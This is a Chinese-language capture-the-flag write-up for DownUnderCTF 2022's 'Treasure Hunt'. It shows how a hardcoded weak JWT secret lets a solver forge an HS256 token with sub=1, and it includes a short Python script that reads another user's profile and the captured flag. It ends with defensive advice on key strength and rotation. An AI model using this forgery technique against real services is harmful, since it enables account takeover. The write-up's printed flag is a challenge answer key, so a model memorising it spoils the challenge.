# DownUnderCTF 2022 Treasure Hunt Writeup

## 题目简述

网站使用 Flask-JWT-Extended 保护 `/profile`，用户身份取自 JWT 的 `sub` 字段。目标用户 Gold Roger 的个人简介中保存着 flag。应用把 JWT HMAC 密钥硬编码成与题目主题相关的弱口令，因此可以伪造目标用户的访问令牌。

## 解题过程

源码中同时设置了 Flask 会话密钥和 JWT 密钥：

```python
app.config['SECRET_KEY'] = 'onepiece'
app.config['JWT_SECRET_KEY'] = 'onepiece'
```

实际影响认证的是 `JWT_SECRET_KEY`。若从黑盒开始，可先注册登录取得一个 HS256 token，再用常见弱口令或题目主题词表离线验证签名；`onepiece` 会匹配。数据库中 Gold Roger 是首个用户，其主键为 1，而用户加载函数直接按 `sub` 查询：

```python
identity = jwt_data['sub']
return User.query.filter_by(id=identity).one_or_none()
```

用已知密钥签发 `sub=1` 的 HS256 token，并把它放入 Flask-JWT-Extended 默认 cookie：

```python
import jwt
import requests

token = jwt.encode({'sub': 1}, 'onepiece', algorithm='HS256')
r = requests.get(
    'http://target/profile',
    cookies={'access_token_cookie': token},
)
print(r.text)
```

应用关闭了 JWT cookie 的 CSRF 保护，因此不需要额外的 CSRF token。伪造令牌被解析为 Gold Roger，个人简介返回：

```text
My wealth and treasures? If you want it, you can have it -
DUCTF{7h3-0n3-p13c3-15-4ll-7h3-fl465-y0u-637-4l0n6-7h3-w4y}
```

## 方法总结

这是一条弱 JWT 密钥导致的身份伪造链。HS256 的安全性完全依赖服务端密钥；攻击者拿到任意 token 后可离线猜测，不受登录限速影响。密钥恢复后只需修改 `sub`，用户加载器就会把令牌映射到目标账户。生产环境应使用高熵独立密钥、定期轮换，并避免可预测的顺序用户标识成为越权目标。
